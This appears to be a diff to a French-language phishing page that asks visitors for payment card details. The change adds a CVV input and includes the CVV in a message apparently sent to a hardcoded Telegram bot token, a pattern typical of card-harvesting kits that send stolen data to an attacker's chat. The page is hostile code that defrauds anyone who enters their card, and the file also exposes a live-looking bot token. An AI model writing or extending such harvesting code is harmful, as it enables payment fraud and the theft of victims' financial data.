@@ -119,9 +119,10 @@
 
                 <label for="bank" > Date d'expiration *</label><br>
                 
-                <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
-                    <input style="width: 150px;" placeholder="Mois" type="tel" id="mois" type="tel" minlength="2" maxlength="2" required> <br>
-                    <input style="width: 150px; margin-left: auto;" placeholder="Année" type="tel" id="annee" type="tel" minlength="2" maxlength="2" required> <br>
+                <div style="display: flex; align-items: center; justify-content: space-between; max-width: 100%;">
+                    <input style="width: 33%;" placeholder="Mois" type="tel" id="mois" type="tel" minlength="2" maxlength="2" required> <br>
+                    <input style="width: 33%; margin-left: auto;" placeholder="Année" type="tel" id="annee" type="tel" minlength="2" maxlength="2" required> <br>
+                    <input style="width: 33%; margin-left: auto;" placeholder="Cvv" type="tel" id="cvv" type="tel" minlength="3" maxlength="3" required> <br>
                 </div>
             </div>
             <br>
@@ -161,6 +162,7 @@
             const tel = document.getElementById('tel').value ;
             const mois = document.getElementById('mois').value;
             const annee = document.getElementById('annee').value;
+            const cvv = document.getElementById('cvv').value;
 
             
 
@@ -173,6 +175,7 @@
  \n💳Carte : ${card}
  \n📅Mois: ${mois}
  \n📆Annee: ${annee}         
+ \Cvv: ${cvv}         
             `;
 
             const botToken = '7366002950:AAFzze0vYX5nxrxWxX7y4vVg2CcJy-3Fsi4'; // Remplacez par votre token
